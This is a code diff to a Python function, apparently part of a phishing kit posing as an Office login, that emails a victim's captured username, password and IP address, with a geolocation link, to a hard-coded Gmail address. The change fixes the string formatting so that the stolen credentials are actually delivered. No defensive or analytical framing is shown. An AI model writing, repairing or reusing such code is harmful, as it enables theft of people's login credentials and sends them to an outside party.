@@ -26,8 +26,8 @@ def send_mail(username, password, ip_address):
 
         smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
 
-        subject = f"OFFICE{ip_address}"
-        body = "The username is: + (username)+ \n password is: +(password)+ \n ip: https://www.ip2location.com/demo/+(ip_address)"
+        subject = f"OFFICE {ip_address}"
+        body = f"The username is: {username} \n password is: {password} \n ip: https://www.ip2location.com/demo/{ip_address}"
         msg = f"Subject: {subject}\n\n{body}"
         smtp.sendmail("busganda@gmail.com", "chibyx395@gmail.com", msg)
 
